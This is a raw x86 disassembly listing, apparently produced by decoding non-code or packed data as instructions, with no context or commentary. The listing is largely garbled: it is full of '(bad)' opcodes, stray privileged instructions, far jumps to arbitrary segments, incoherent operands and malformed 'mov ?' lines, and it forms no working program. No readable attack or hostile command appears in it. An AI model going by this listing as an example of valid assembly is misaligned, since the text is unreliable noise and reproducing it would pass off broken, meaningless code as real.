  4102a2:	stos   DWORD PTR es:[edi],eax
  4102a3:	inc    eax
  4102a4:	lods   al,BYTE PTR ds:[esi]
  4102a5:	call   0xfa0c:0x96a6c238
  4102ac:	shl    bl,1
  4102ae:	xchg   esp,eax
  4102af:	dec    edx
  4102b0:	aaa    
  4102b1:	idiv   BYTE PTR [ebp+0x77]
  4102b4:	aam    0x5f
  4102b6:	or     DWORD PTR [edx+ecx*1-0x73f1a8fa],eax
  4102bd:	sub    BYTE PTR [ebx+0x5a],bl
  4102c0:	sbb    DWORD PTR [esi],ebx
  4102c2:	and    al,BYTE PTR [ebx+0x52ce8f14]
  4102c8:	fisttp WORD PTR [edi+0x1686727d]
  4102ce:	clc    
  4102cf:	clc    
  4102d0:	cli    
  4102d1:	les    edi,FWORD PTR [ebp+0x1a6006c0]
  4102d7:	add    al,0x1a
  4102d9:	(bad)  
  4102da:	aam    0xc6
  4102dc:	ds inc ebp
  4102de:	cmp    esi,DWORD PTR [edi-0x154fc6a8]
  4102e4:	jp     0x4102ea
  4102e6:	xchg   edx,eax
  4102e7:	jo     0x41034f
  4102e9:	xchg   edx,eax
  4102ea:	popa   
  4102eb:	xor    ebp,DWORD PTR [ebp+0x47]
  4102ee:	imul   ebx,DWORD PTR [edi-0x51],0x9d24820a
  4102f5:	jne    0x4102b6
  4102f7:	push   edi
  4102f8:	fnstcw WORD PTR [eax-0x58]
  4102fb:	shr    BYTE PTR [eax],1
  4102fd:	psadbw mm2,QWORD PTR [ecx+ebx*4+0x75]
  410302:	pop    esp
  410303:	retf   
  410304:	fsubr  QWORD PTR [edx+0x7]
  410307:	aas    
  410308:	add    DWORD PTR [edi],ebp
  41030a:	jmp    0x554d:0xafba1dd2
  410311:	fwait
  410312:	fs sub al,0x5
  410315:	lahf   
  410316:	shl    DWORD PTR ds:0x23e2826f,cl
  41031c:	es sbb cx,cx
  410320:	mov    ecx,0xbb309ec4
  410325:	lock xor DWORD PTR [eax+0x67],ecx
  410329:	call   0x9fccac0c
  41032e:	fld    QWORD PTR [ecx]
  410330:	mov    ebx,0x9add0e89
  410335:	ins    BYTE PTR es:[edi],dx
  410336:	push   cs
  410337:	push   cs
  410338:	push   es
  410339:	call   FWORD PTR [edx-0x5d]
  41033c:	xchg   edi,eax
  41033d:	add    eax,0xc7334da6
  410342:	sub    edx,esp
  410344:	push   ss
  410345:	retf   0x66a
  410348:	sub    DWORD PTR ds:0x4c13935f,0xc972d468
  410352:	(bad)  
  410353:	jmp    0x3ac8eb87
  410358:	neg    DWORD PTR [eax]
  41035a:	lds    edi,FWORD PTR [eax]
  41035c:	mov    eax,ds:0xf1e1a24d
  410361:	js     0x410357
  410363:	jns    0x410305
  410365:	push   0x31
  410367:	and    BYTE PTR [edi-0x59d6db62],dl
  41036d:	ds xor al,0x5e
  410370:	enter  0xf2a2,0x86
  410374:	push   ecx
  410375:	xchg   ebx,eax
  410376:	push   eax
  410377:	or     eax,0xae9eda00
  41037c:	mov    bh,0x18
  41037e:	in     al,dx
  41037f:	adc    eax,0xb44e0632
  410384:	rcr    cl,0xc3
  410387:	mov    dl,0xc9
  410389:	(bad)  
  41038a:	addr16 jnp 0x41034d
  41038d:	data16 sub ah,BYTE PTR [ecx+edi*1]
  410391:	(bad)  
  410392:	lock or al,0xdb
  410395:	or     edi,DWORD PTR [ebp+0x6fac330d]
  41039b:	out    dx,al
  41039c:	fcom   QWORD PTR [esi]
  41039e:	lahf   
  41039f:	xchg   BYTE PTR [edx],bl
  4103a1:	sar    DWORD PTR [ebp+0x27f9faa4],1
  4103a7:	dec    edx
  4103a8:	add    BYTE PTR [esi+0x22c21c8d],dh
  4103ae:	pop    ebx
  4103af:	jns    0x41035c
  4103b1:	sbb    BYTE PTR [esi+0x69],0xe
  4103b5:	inc    ecx
  4103b6:	jle    0x410422
  4103b8:	push   edi
  4103b9:	rcr    BYTE PTR [ebx-0x5d],cl
  4103bc:	sbb    BYTE PTR [ebp-0x15],dh
  4103bf:	popa   
  4103c0:	(bad)  
  4103c1:	retf   
  4103c2:	ret    0xed70
  4103c5:	jle    0x410394
  4103c7:	xor    dh,BYTE PTR [ebx]
  4103c9:	std    
  4103ca:	jl     0x410388
  4103cc:	ror    BYTE PTR [edx],cl
  4103ce:	call   0x6e54:0x41978e63
  4103d5:	bound  esi,QWORD PTR [esp+esi*8+0x11]
  4103d9:	call   0x599d43b9
  4103de:	rcr    DWORD PTR [edi+0x5b6c34a9],cl
  4103e4:	cmc    
  4103e5:	pop    ecx
  4103e6:	aam    0x9a
  4103e8:	loope  0x41037c
  4103ea:	sub    esp,DWORD PTR [ebx-0x41]
  4103ed:	mov    bl,0xb3
  4103ef:	inc    ebp
  4103f0:	mov    dl,0x39
  4103f2:	inc    edx
  4103f3:	push   eax
  4103f4:	and    BYTE PTR [esi-0x7b],cl
  4103f7:	jb     0x4103b2
  4103f9:	push   ss
  4103fa:	daa    
  4103fb:	mov    dl,0xc2
  4103fd:	fwait
  4103fe:	loope  0x410400
  410400:	dec    edx
  410401:	test   eax,0x7d2848f9
  410406:	test   eax,0x4304743f
  41040b:	xchg   edx,eax
  41040c:	ss fdivr st,st(1)
  41040f:	mov    eax,DWORD PTR [ebx+eiz*2+0x3e]
  410413:	imul   ebx,DWORD PTR [edx],0x638f075c
  410419:	mov    esp,0xf4d2ca30
  41041e:	sar    DWORD PTR [esi+0x77],cl
  410421:	push   0x5254027b
  410426:	jno    0x4103e2
  410428:	rcl    BYTE PTR [edi-0x33],1
  41042b:	cmp    edx,DWORD PTR [esi+0x16]
  41042e:	jae    0x41040d
  410430:	xor    al,0x1
  410432:	hlt    
  410433:	nop
  410434:	sub    al,0xb7
  410436:	cmp    DWORD PTR [esi-0x67b72e01],ebp
  41043c:	sub    al,0x48
  41043e:	idiv   BYTE PTR [esi+0xeb1c705]
  410444:	mov    cx,0xf938
  410448:	icebp  
  410449:	mov    ds:0x16845fdc,al
  41044e:	push   ds
  41044f:	pop    esp
  410450:	pop    eax
  410451:	adc    eax,0x5335225
  410456:	xchg   edx,eax
  410457:	or     DWORD PTR [edx],edi
  410459:	and    al,0xfd
  41045b:	js     0x410444
  41045d:	add    ebp,DWORD PTR [edx]
  41045f:	add    ecx,DWORD PTR [esi+0x2f9914ce]
  410465:	loope  0x4104e0
  410467:	jp     0x41040a
  410469:	mov    al,ds:0x3ca8cea1
  41046e:	out    dx,al
  41046f:	sahf   
  410470:	or     dh,BYTE PTR [eax]
  410472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410473:	ins    BYTE PTR es:[edi],dx
  410474:	aaa    
  410475:	outs   dx,BYTE PTR ds:[esi]
  410476:	jmp    0x31ed:0xf6fe5093
  41047d:	hlt    
  41047e:	dec    ecx
  41047f:	je     0x4104db
  410481:	je     0x410403
  410483:	lahf   
  410484:	push   cs
  410485:	mov    ah,0xd9
  410487:	xchg   esp,eax
  410488:	aaa    
  410489:	push   ebp
  41048a:	mov    esp,0x6fcc7d5f
  41048f:	inc    esp
  410490:	mov    ebx,0x4d1e9d66
  410495:	inc    edi
  410496:	mov    eax,ds:0xba858923
  41049b:	data16 jae 0x4104d4
  41049e:	loopne 0x4104fe
  4104a0:	mov    edx,DWORD PTR [edx+0x21]
  4104a3:	jae    0x410468
  4104a5:	dec    ecx
  4104a6:	out    dx,ax
  4104a8:	pusha  
  4104a9:	xchg   ebp,eax
  4104aa:	and    BYTE PTR [ecx],0x9a
  4104ad:	inc    ebp
  4104ae:	jge    0x4104e0
  4104b0:	retf   0x8908
  4104b3:	mov    ss,WORD PTR [ebx]
  4104b5:	inc    edi
  4104b6:	sub    al,0x90
  4104b8:	hlt    
  4104b9:	push   ecx
  4104ba:	and    al,0xc3
  4104bc:	jl     0x4104c6
  4104be:	stos   BYTE PTR es:[edi],al
  4104bf:	ss popf 
  4104c1:	sbb    DWORD PTR ds:0xb76bd243,eax
  4104c7:	repz jp 0x4104e2
  4104ca:	adc    al,BYTE PTR ds:0x1b93a415
  4104d0:	dec    esp
  4104d1:	in     al,0x1c
  4104d3:	fs adc dl,al
  4104d6:	add    DWORD PTR [edi-0x8],0xffffffdc
  4104da:	ss inc eax
  4104dc:	data16 (bad) 
  4104de:	xor    ch,ah
  4104e0:	or     BYTE PTR [ebx+0x61],cl
  4104e3:	stos   DWORD PTR es:[edi],eax
  4104e4:	iret   
  4104e5:	lahf   
  4104e6:	and    DWORD PTR [edi+ebx*1-0x25],eax
  4104ea:	mov    esp,DWORD PTR [ebp+0x66aa2668]
  4104f0:	shl    bh,1
  4104f2:	sar    BYTE PTR [edi-0x70],1
  4104f5:	inc    ebp
  4104f6:	ret    
  4104f7:	rcr    DWORD PTR [edx+ebx*4],0x46
  4104fb:	inc    edi
  4104fc:	or     BYTE PTR [edi+ebx*4-0x189b26a1],0xbf
  410504:	arpl   WORD PTR [ebp+0x3954dc32],di
  41050a:	mov    dh,al
  41050c:	(bad)  
  41050d:	test   BYTE PTR [esi],0x99
  410510:	out    0x9,al
  410512:	js     0x4104cf
  410514:	xchg   edi,eax
  410515:	sub    DWORD PTR [ebp-0x10],ebx
  410518:	xchg   dx,ax
  41051a:	mov    WORD PTR [edi-0x73],es
  41051d:	pop    edx
  41051e:	add    edi,DWORD PTR [ebx]
  410520:	ins    BYTE PTR es:[edi],dx
  410521:	test   al,0xa9
  410523:	add    eax,DWORD PTR [eax+0x4d]
  410526:	sti    
  410527:	pop    edx
  410528:	push   ecx
  410529:	jmp    0x410539
  41052b:	cmc    
  41052c:	pop    esi
  41052d:	mov    BYTE PTR ds:0xcfbad5a8,ah
  410533:	and    cl,BYTE PTR [ecx+edx*8+0x1a]
  410537:	adc    ah,ah
  410539:	sbb    BYTE PTR [ebx-0x5a],al
  41053c:	or     bh,BYTE PTR [edx+0x758e2455]
  410542:	dec    edx
  410543:	into   
  410544:	sar    ch,cl
  410546:	push   es
  410547:	(bad)  
  410548:	imul   BYTE PTR [ebx+0x77c6ddb9]
  41054e:	ret    0x3b51
  410551:	jl     0x410589
  410553:	push   es
  410554:	sbb    BYTE PTR [ebx],al
  410556:	call   FWORD PTR [ebp-0x71]
  410559:	mov    edi,0xb771216e
  41055e:	iret   
  41055f:	xchg   esp,eax
  410560:	pushf  
  410561:	pop    ebx
  410562:	xchg   edx,eax
  410563:	test   bl,bl
  410565:	pop    ebx
  410566:	fdivr  DWORD PTR ds:0xad6d0dae
  41056c:	daa    
  41056d:	push   0xad0251f3
  410572:	repz test eax,0xbbdbc6b2
  410578:	out    0xa,eax
  41057a:	push   0xffffffe7
  41057c:	push   ebp
  41057d:	sbb    bh,BYTE PTR [eax-0x432eceb5]
  410583:	mov    cl,0xa2
  410585:	leave  
  410586:	clc    
  410587:	lds    esi,FWORD PTR [ebp-0x32]
  41058a:	retf   0x6145
  41058d:	icebp  
  41058e:	pushf  
  41058f:	mov    esi,es
  410591:	int3   
  410592:	enter  0xef81,0xdf
  410596:	fadd   st(2),st
  410598:	jae    0x410561
  41059a:	dec    esp
  41059b:	fimul  DWORD PTR [esi]
  41059d:	fild   WORD PTR ds:0x3f6900e2
  4105a3:	jns    0x410531
  4105a5:	push   edx
  4105a6:	popfw  
  4105a8:	scas   eax,DWORD PTR es:[edi]
  4105a9:	mov    esp,DWORD PTR [edi]
  4105ab:	sub    ch,ah
  4105ad:	int3   
  4105ae:	dec    eax
  4105af:	push   0x8a5a35d2
  4105b4:	pop    ebp
  4105b5:	dec    eax
  4105b6:	test   eax,0x1a3fb066
  4105bb:	lods   eax,DWORD PTR ds:[esi]
  4105bc:	pop    ebx
  4105bd:	dec    eax
  4105be:	std    
  4105bf:	test   eax,0x6f63af44
  4105c4:	sbb    ecx,DWORD PTR [ebx-0x65]
  4105c7:	imul   eax,DWORD PTR [ebx+0x6c],0x7cd776a2
  4105ce:	add    DWORD PTR [edi],ebp
  4105d0:	jle    0x4105dd
  4105d2:	sbb    al,0x0
  4105d4:	enter  0x18f3,0x5f
  4105d8:	mov    ds:0xcd2c6e89,al
  4105dd:	sbb    BYTE PTR [ecx-0xc],0x2f
  4105e1:	int    0xeb
  4105e3:	sbb    eax,0x1fe1c582
  4105e8:	loop   0x41062d
  4105ea:	mov    ds:0xe763b34,eax
  4105ef:	loop   0x4105a8
  4105f1:	cmp    DWORD PTR [ebp+esi*4-0x1a],esi
  4105f5:	sub    dl,dh
  4105f7:	add    al,0xa7
  4105f9:	cld    
  4105fa:	jmp    0xd0d1a12
  4105ff:	and    DWORD PTR [esi-0x5f],edi
  410602:	cdq    
  410603:	and    edx,ebx
  410605:	icebp  
  410606:	push   cs
  410607:	sbb    DWORD PTR [ebp-0x11c02c6f],edx
  41060d:	and    al,0xe1
  41060f:	xor    al,0x84
  410611:	in     eax,0x1a
  410613:	in     eax,dx
  410614:	push   ebp
  410615:	inc    eax
  410616:	fidivr DWORD PTR [edi]
  410618:	in     eax,dx
  410619:	or     DWORD PTR [edx+0x5f],ecx
  41061c:	mov    esp,0x2301ad3f
  410621:	test   eax,0x1603afc3
  410626:	imul   edi,DWORD PTR [edx+0x7baf864e],0x891c0645
  410630:	fs lahf 
  410632:	cmp    eax,0xd7cf4d1f
  410637:	in     al,0x21
  410639:	mov    ds:0xc08080e5,al
  41063e:	aas    
  41063f:	in     eax,0x3c
  410641:	loopne 0x410653
  410643:	mov    ebx,0xe3f4e60a
  410648:	pop    edx
  410649:	jno    0x4106c5
  41064b:	or     DWORD PTR [ecx-0x714f174a],edi
  410651:	mov    ebp,DWORD PTR [edx-0x28]
  410654:	fdivr  DWORD PTR [ebp+0xb]
  410657:	mov    eax,0x441610da
  41065c:	cmp    esi,DWORD PTR [ebp-0x10]
  41065f:	inc    edx
  410660:	inc    esp
  410661:	inc    edx
  410662:	loopne 0x410622
  410664:	sub    BYTE PTR [ebp+0x26],bl
  410667:	cmp    DWORD PTR [esi-0x1baec7ca],ecx
  41066d:	ins    DWORD PTR es:[edi],dx
  41066e:	bound  ebx,QWORD PTR [edx-0x5b]
  410671:	pop    ebp
  410672:	leave  
  410673:	dec    esi
  410674:	fimul  WORD PTR [edx-0x64e3c872]
  41067a:	xchg   edi,eax
  41067b:	shr    DWORD PTR [edx-0x4ef71355],cl
  410681:	push   ecx
  410682:	jne    0x41063f
  410684:	(bad)  
  410686:	rcr    DWORD PTR [edi],1
  410688:	aad    0xa4
  41068a:	adc    eax,0x3486d8c2
  41068f:	cmp    DWORD PTR [ebx],ebx
  410691:	dec    esp
  410692:	sbb    BYTE PTR [ebx],bl
  410694:	inc    esi
  410695:	mov    esp,DWORD PTR [esi]
  410697:	pop    esp
  410698:	(bad)  
  41069a:	pop    esi
  41069b:	jae    0x4106aa
  41069d:	sar    BYTE PTR ds:0x4aa2bfe4,1
  4106a3:	(bad)  
  4106a4:	sti    
  4106a5:	retf   0x47ff
  4106a8:	xchg   DWORD PTR [bp-0x1c],edx
  4106ac:	call   0x33413c9
  4106b1:	stc    
  4106b2:	pop    ds
  4106b3:	pop    esi
  4106b4:	mov    esp,0x38e2a7d5
  4106b9:	scas   eax,DWORD PTR es:[edi]
  4106ba:	jbe    0x4106f7
  4106bc:	cdq    
  4106bd:	in     al,0xa8
  4106bf:	sbb    ch,BYTE PTR [ebp+0x3c351cd6]
  4106c5:	dec    edx
  4106c6:	and    bl,ah
  4106c8:	push   esi
  4106c9:	mov    WORD PTR [ecx],es
  4106cb:	cmp    eax,0xa2bae14e
  4106d0:	push   esp
  4106d1:	in     eax,0x7c
  4106d3:	mul    DWORD PTR [edx]
  4106d5:	mov    al,0xf2
  4106d7:	pop    ss
  4106d8:	loop   0x4106fa
  4106da:	js     0x410735
  4106dc:	fldenv [edx-0x31165199]
  4106e2:	(bad)  
  4106e3:	mov    edx,0x738f53bb
  4106e8:	ins    BYTE PTR es:[edi],dx
  4106e9:	data16 aaa 
  4106eb:	or     dh,ah
  4106ed:	adc    DWORD PTR [ebx+0x3cd8ed85],edx
  4106f3:	out    0x2d,eax
  4106f5:	ret    
  4106f6:	pop    ebp
  4106f7:	sub    BYTE PTR [edi],cl
  4106f9:	imul   edx,edi,0x42a8f4b2
  4106ff:	jmp    0x77a9:0xd6f8b277
  410706:	inc    ebp
  410707:	out    0x1,eax
  410709:	adc    al,0xc4
  41070b:	dec    edi
  41070c:	stc    
  41070d:	in     eax,0xc6
  41070f:	mov    cl,0x7
  410711:	xor    eax,0x78a7d38e
  410717:	push   ebp
  410718:	aas    
  410719:	inc    esp
  41071a:	cmp    al,ah
  41071c:	popf   
  41071d:	and    DWORD PTR [ecx+0x70],eax
  410720:	shl    DWORD PTR [esi+ebx*8],1
  410723:	jo     0x4106e0
  410725:	dec    edx
  410726:	mov    ds:0x47c1f363,al
  41072b:	fwait
  41072c:	loope  0x41073b
  41072e:	and    ch,BYTE PTR [edx-0x6d3d2a0]
  410734:	leave  
  410735:	idiv   DWORD PTR [ebp+0x685a3b17]
  41073b:	mov    al,0x1f
  41073d:	sub    al,0x4e
  41073f:	add    eax,0x9f351a1e
  410744:	xchg   ebx,eax
  410745:	jmp    0x8fd1c4fa
  41074a:	pop    edx
  41074b:	mov    dl,0x8c
  41074d:	call   0x33ab:0xc2df0adc
  410754:	pop    ebp
  410755:	jl     0x410747
  410757:	aaa    
  410758:	fild   DWORD PTR [eax]
  41075a:	push   edx
  41075b:	fidiv  WORD PTR [eax-0x2]
  41075e:	mov    eax,edx
  410760:	adc    BYTE PTR ds:0x2d78f5ab,cl
  410766:	(bad)  
  410768:	scas   eax,DWORD PTR es:[edi]
  410769:	xor    bl,BYTE PTR [edi-0x58d323f5]
  41076f:	inc    ecx
  410770:	aas    
  410771:	xchg   ecx,eax
  410772:	test   ebx,0xbf7c1972
  410778:	out    0x7,al
  41077a:	inc    esi
  41077b:	jmp    0xf751:0x9a13c754
  410782:	imul   eax,DWORD PTR [edx+0x4b31bbac],0xffffffe4
  410789:	push   es
  41078a:	dec    ecx
  41078b:	fsub   QWORD PTR [esi+0x4a]
  41078e:	(bad)  
  41078f:	into   
  410790:	int3   
  410791:	pop    esp
  410792:	mov    ch,0xcb
  410794:	loope  0x4107b6
  410796:	cmp    dh,cl
  410798:	stc    
  410799:	xchg   BYTE PTR [edx],bh
  41079b:	je     0x4107c7
  41079d:	loope  0x41076e
  41079f:	jecxz  0x410763
  4107a1:	adc    DWORD PTR [edi],0x17f7a187
  4107a7:	pop    ss
  4107a8:	in     al,dx
  4107a9:	xchg   ebp,eax
  4107aa:	mov    eax,0xfd8f980
  4107af:	inc    edi
  4107b0:	in     eax,0x31
  4107b2:	push   0xdb3290d
  4107b7:	aad    0x78
  4107b9:	cli    
  4107ba:	jns    0x4107d1
  4107bc:	ds pop ss
  4107be:	cli    
  4107bf:	rol    DWORD PTR [esi],0x5a
  4107c2:	sbb    ecx,DWORD PTR [ebp-0x520ccff7]
  4107c8:	mov    bl,0xf0
  4107ca:	inc    ecx
  4107cb:	xlat   BYTE PTR ds:[ebx]
  4107cc:	jmp    0x66:0xe21ecc6e
  4107d3:	outs   dx,DWORD PTR ds:[esi]
  4107d4:	sbb    ch,BYTE PTR [eax]
  4107d6:	jno    0x4107ff
  4107d8:	xchg   edx,eax
  4107d9:	cld    
  4107da:	or     al,BYTE PTR [edi]
  4107dc:	or     DWORD PTR [edx],ecx
  4107de:	test   eax,0xe219c25e
  4107e3:	mov    ch,0xc9
  4107e5:	arpl   di,ax
  4107e7:	ins    DWORD PTR es:[edi],dx
  4107e8:	mov    ch,ch
  4107ea:	xchg   DWORD PTR [eax-0x41a5a081],esi
  4107f0:	push   ebx
  4107f1:	mov    dl,0x83
  4107f3:	fs pushf 
  4107f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107f6:	xchg   ebp,eax
  4107f7:	loopne 0x41080f
  4107f9:	imul   dx,dx,0x3f
  4107fd:	fdivp  st(1),st
  4107ff:	test   BYTE PTR ds:0x70688415,bl
  410805:	and    DWORD PTR [ecx-0x28f209d9],0x7e
  41080c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41080e:	xchg   ecx,eax
  41080f:	test   eax,0xd99e9f60
  410814:	scas   eax,DWORD PTR es:[edi]
  410815:	(bad)  
  410816:	jno    0x410834
  410818:	ret    0xc309
  41081b:	pushf  
  41081c:	rol    DWORD PTR [ebx-0x1e81f4d3],0xf5
  410823:	sbb    ebx,DWORD PTR [eax+ebp*4+0x905ed7f]
  41082a:	lods   eax,DWORD PTR ds:[esi]
  41082b:	and    eax,0x80768e15
  410830:	hlt    
  410831:	(bad)  
  410833:	inc    ebp
  410834:	retf   0x6a9b
  410837:	out    0x67,al
  410839:	cmp    eax,0xe6c5f8dc
  41083e:	(bad)  
  41083f:	jae    0x4107ea
  410841:	dec    eax
  410842:	aas    
  410843:	cmp    al,0x44
  410845:	retf   
  410846:	pop    edi
  410847:	scas   al,BYTE PTR es:[edi]
  410848:	xor    ch,BYTE PTR [ebx]
  41084a:	ja     0x410803
  41084c:	daa    
  41084d:	pushf  
  41084e:	add    BYTE PTR [edi],dl
  410850:	inc    edi
  410851:	push   ebx
  410852:	aad    0x73
  410854:	cmp    eax,0xc7b621ca
  410859:	push   cs
  41085a:	and    ebp,DWORD PTR [edi+0x4d]
  41085d:	out    0x1f,eax
  41085f:	in     al,dx
  410860:	shl    DWORD PTR [esi],0xd8
  410863:	ins    DWORD PTR es:[edi],dx
  410864:	add    edi,DWORD PTR [esi]
  410866:	mov    dl,BYTE PTR [edi+0x5bb76138]
  41086c:	mov    ?,WORD PTR [ebx+0x7d]
  41086f:	mov    dl,0xa8
  410871:	sbb    ecx,DWORD PTR [eax-0x28d8a0a8]
  410877:	bound  ebp,QWORD PTR [ebx-0x1e596c54]
  41087d:	jno    0x410824
  41087f:	in     al,0xf7
  410881:	sub    DWORD PTR ds:[ecx-0x8],ecx
  410885:	push   edi
  410886:	stos   DWORD PTR es:[edi],eax
  410887:	jno    0x4108ef
  410889:	js     0x410823
  41088b:	dec    edi
  41088c:	add    DWORD PTR [ebx],ebp
  41088e:	icebp  
  41088f:	mov    al,ds:0x5a100c4c
  410894:	xor    DWORD PTR [ebx+ebx*2-0x6c3e3952],ecx
  41089b:	aad    0x1c
  41089d:	dec    edi
  41089f:	outs   dx,BYTE PTR ds:[esi]
  4108a0:	cmp    BYTE PTR [ebx+0x38b74cba],bh
  4108a6:	xor    al,0xe3
  4108a8:	xchg   esi,eax
  4108a9:	xlat   BYTE PTR ds:[ebx]
  4108aa:	mov    ds:0x523aac30,al
  4108af:	mov    esi,0x6878fbc6
  4108b4:	cmp    DWORD PTR [ebx-0x65242301],ecx
  4108ba:	mov    dh,0xe1
  4108bc:	jg     0x410884
  4108be:	sub    al,0x97
  4108c0:	das    
  4108c1:	jmp    0xea38:0xe17f656e
  4108c8:	dec    ecx
  4108c9:	or     esp,DWORD PTR [edi-0x49]
  4108cc:	out    0xc5,al
  4108ce:	(bad)  
  4108cf:	push   edi
  4108d0:	push   edx
  4108d1:	rcl    DWORD PTR [ebp-0x60350dd],1
  4108d7:	in     eax,dx
  4108d8:	scas   al,BYTE PTR es:[edi]
  4108d9:	cdq    
  4108da:	jecxz  0x4108f8
  4108dc:	test   al,0xd
  4108de:	pop    esp
  4108df:	ins    BYTE PTR es:[edi],dx
  4108e0:	lods   al,BYTE PTR ds:[esi]
  4108e1:	pop    ss
  4108e2:	xchg   edi,eax
  4108e3:	push   ebp
  4108e4:	fs js  0x410944
  4108e7:	push   edi
  4108e8:	jae    0x41090f
  4108ea:	stos   BYTE PTR es:[edi],al
  4108eb:	pop    eax
  4108ec:	fs stos DWORD PTR es:[edi],eax
  4108ee:	fstp   DWORD PTR [edi-0x1b6c8bf5]
  4108f4:	mov    esp,0x296ee6cf
  4108f9:	dec    esp
  4108fa:	movlps xmm5,QWORD PTR [eax+ecx*2+0x2]
  4108ff:	stos   DWORD PTR es:[edi],eax
  410900:	sub    cl,BYTE PTR [esi]
  410902:	inc    edx
  410903:	adc    eax,0x113d7286
  410908:	sub    BYTE PTR [di+0x36],0x42
  41090d:	sahf   
  41090e:	daa    
  41090f:	or     edx,ebp
  410911:	inc    eax
  410912:	mov    esi,DWORD PTR [edi-0x6cfee172]
  410918:	sub    dh,cl
  41091a:	imul   eax,DWORD PTR [esp+eiz*2+0x5b54d7cb],0x6144258a
  410925:	adc    cl,al
  410927:	addr16 loop 0x4108f3
  41092a:	mov    esi,0x8e7c5c0f
  41092f:	imul   esp,DWORD PTR [eax-0x988b5f0],0x40
  410936:	repnz adc dh,bl
  410939:	cmp    al,0x3
  41093b:	lods   eax,DWORD PTR ds:[esi]
  41093c:	ja     0x4108d0
  41093e:	inc    edi
  41093f:	lods   eax,DWORD PTR ds:[esi]
  410940:	fs mov ch,0x17
  410943:	push   eax
  410944:	mov    bh,0xf2
  410946:	dec    esi
  410947:	cmp    al,0x88
  410949:	inc    esi
  41094a:	adc    al,0x38
  41094c:	test   al,0xf5
  41094e:	sbb    BYTE PTR [ecx+0x55e85a77],ch
  410954:	mov    ebx,0xf30f86f0
  410959:	lock or edx,ebx
  41095c:	fbld   TBYTE PTR [ebp+0x20233fc3]
  410962:	retf   0x99ec
  410965:	call   0x430e930b
  41096a:	sub    BYTE PTR [eax-0x4d],ah
  41096d:	mov    edi,0x2ac63a9f
  410972:	nop
  410973:	adc    al,0xae
  410975:	adc    ebx,ecx
  410977:	mov    eax,ds:0xc54d256
  41097c:	ror    DWORD PTR [ecx-0x49],cl
  41097f:	stc    
  410980:	or     eax,0xc5872c62
  410985:	cmp    al,0x65
  410987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410988:	pop    esp
  410989:	mov    ss,WORD PTR [ebx]
  41098b:	imul   edi,DWORD PTR [eax-0x4736ae75],0x22
  410992:	aaa    
  410993:	add    eax,0x51441ed3
  410998:	arpl   WORD PTR [eax+0x42],bp
  41099b:	push   ebp
  41099c:	outs   dx,DWORD PTR ds:[esi]
  41099d:	pushf  
  41099e:	lds    esi,FWORD PTR [ebp+0x35e8aae3]
  4109a4:	ins    BYTE PTR es:[edi],dx
  4109a5:	out    0xaf,eax
  4109a7:	xchg   edx,eax
  4109a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109a9:	jne    0x4109d9
  4109ab:	dec    eax
  4109ac:	int3   
  4109ad:	sbb    dh,BYTE PTR [eax]
  4109af:	test   DWORD PTR [eax+ebx*8-0x60],ebx
  4109b3:	and    al,0x5e
  4109b5:	cmp    eax,0xe8846664
  4109ba:	test   al,0x66
  4109bc:	ficomp WORD PTR [esi+0x1c]
  4109bf:	add    BYTE PTR [ebp-0x60755fdb],ah
  4109c5:	repz call 0x92a05028
  4109cb:	jb     0x410a47
  4109cd:	push   ds
  4109ce:	xchg   esi,eax
  4109cf:	jg     0x4109ee
  4109d1:	out    0x73,al
  4109d3:	icebp  
  4109d4:	add    cl,BYTE PTR [esi]
  4109d6:	repz push cs
  4109d8:	aas    
  4109d9:	mov    WORD PTR [esi+0x60],fs
  4109dc:	sub    DWORD PTR [eax],ebp
  4109de:	leave  
  4109df:	xchg   DWORD PTR [ebx+0x2d],edx
  4109e2:	cmc    
  4109e3:	xor    ch,dl
  4109e5:	scas   al,BYTE PTR es:[edi]
  4109e6:	iret   
  4109e7:	dec    eax
  4109e8:	pusha  
  4109e9:	push   0xc58f9840
  4109ee:	(bad)  
  4109ef:	sbb    ebx,DWORD PTR [esi+edx*1]
  4109f2:	sbb    eax,0xd229f6ce
  4109f7:	inc    eax
  4109f8:	lds    eax,FWORD PTR [esi]
  4109fa:	(bad)  
  4109fc:	add    ah,BYTE PTR [esi+0x70]
  4109ff:	cmp    eax,0xc5c0c8d3
  410a04:	(bad)  
  410a05:	lods   eax,DWORD PTR ds:[esi]
  410a06:	lods   eax,DWORD PTR ds:[esi]
  410a07:	sahf   
  410a08:	mov    ?,WORD PTR [esi]
  410a0a:	clc    
  410a0b:	xchg   edi,eax
  410a0c:	add    al,0xeb
  410a0e:	retf   
  410a0f:	sbb    edx,DWORD PTR [esi+0x79]
  410a12:	mov    ah,0x8f
  410a15:	imul   edi,DWORD PTR [ecx],0xabf2221f
  410a1b:	mov    bl,0xd2
  410a1d:	test   cl,dl
  410a1f:	xchg   esi,eax
  410a20:	jp     0x4109aa
  410a22:	not    DWORD PTR [ebx]
  410a24:	cmp    BYTE PTR [edx+0x51e0be01],ch
  410a2a:	mov    ds:0xd6c22723,eax
  410a2f:	ins    BYTE PTR es:[edi],dx
  410a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a31:	(bad)  
  410a32:	sbb    BYTE PTR [edx],bl
  410a34:	cmp    edi,DWORD PTR [edx+0x42]
  410a37:	pop    ebx
  410a38:	js     0x410ab5
  410a3a:	lock mov al,0x6
  410a3d:	pop    es
  410a3e:	aas    
  410a3f:	sub    BYTE PTR [esi-0x55],dl
  410a42:	xor    al,0x49
  410a44:	bound  edi,QWORD PTR [esi]
  410a46:	lahf   
  410a47:	in     al,0xc2
  410a49:	adc    edx,esp
  410a4b:	fcom   st(4)
  410a4d:	call   0x775862ce
  410a52:	jo     0x410a92
  410a54:	aas    
  410a55:	cld    
  410a56:	mov    ebp,0x5dcdb4ff
  410a5b:	call   0x5884597
  410a60:	das    
  410a61:	mov    ds:0xbf711cfb,al
  410a66:	jae    0x410a57
  410a68:	mov    ch,0x16
  410a6a:	ficomp DWORD PTR [ebp-0x46]
  410a6d:	or     eax,0xba108c29
  410a72:	test   al,0x29
  410a74:	dec    ebx
  410a75:	jle    0x410ac4
  410a77:	xor    al,0x21
  410a79:	ins    BYTE PTR es:[edi],dx
  410a7a:	bound  ecx,QWORD PTR ds:0x88a5ba8b
  410a80:	add    esi,DWORD PTR [ebp-0x37]
